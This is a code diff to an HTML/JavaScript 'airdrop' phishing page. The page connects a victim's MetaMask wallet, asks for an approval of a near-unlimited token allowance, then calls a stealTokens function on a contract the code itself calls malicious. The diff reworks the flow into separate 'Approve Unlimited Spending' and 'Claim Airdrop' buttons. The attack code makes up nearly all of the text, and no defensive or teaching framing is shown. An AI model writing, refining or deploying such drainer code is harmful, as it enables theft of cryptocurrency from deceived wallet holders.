@@ -10,6 +10,7 @@
   <h1>Claim Your Malicious Airdrop</h1>
 
   <button id="connectButton">Connect to MetaMask</button>
+  <button id="approveButton" disabled>Approve Unlimited Spending</button>
   <button id="claimAirdropButton" disabled>Claim Airdrop</button>
 
   <script>
@@ -129,7 +130,7 @@
           // Request MetaMask connection
           accounts = await ethereum.request({ method: 'eth_requestAccounts' });
           document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
-          document.getElementById('claimAirdropButton').disabled = false; // Enable the claim button
+          document.getElementById('approveButton').disabled = false; // Enable the approve button
         } catch (error) {
           alert('User rejected the request');
         }
@@ -144,15 +145,11 @@
 
       const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
       try {
-        const allowance = await tokenContract.methods.allowance(accounts[0], contractAddress).call();
-        if (parseInt(allowance) === 0) {
-          // Approve unlimited spending (set to a very large number)
-          const approvalAmount = web3.utils.toWei('1000000000', 'ether'); // Set a large number
-          const tx = await tokenContract.methods.approve(contractAddress, approvalAmount).send({ from: accounts[0] });
-          alert('Approval successful!');
-        } else {
-          alert('Already approved!');
-        }
+        // Approve unlimited spending (set to a very large number)
+        const approvalAmount = web3.utils.toWei('1000000000', 'ether'); // Set a large number
+        const tx = await tokenContract.methods.approve(contractAddress, approvalAmount).send({ from: accounts[0] });
+        alert('Approval successful!');
+        document.getElementById('claimAirdropButton').disabled = false; // Enable the claim button
       } catch (error) {
         console.error('Error approving spending:', error);
         alert('Error during approval');
@@ -161,9 +158,6 @@
 
     // Function to claim the airdrop (actually performs the malicious action)
     async function claimAirdrop() {
-      await approveSpending();
-
-      // Now interact with the malicious contract
       const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
       try {
         const tx = await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
@@ -176,8 +170,10 @@
 
     // Set event listeners
     document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+    document.getElementById('approveButton').addEventListener('click', approveSpending);
     document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
   </script>
 </body>
 </html>
+
 
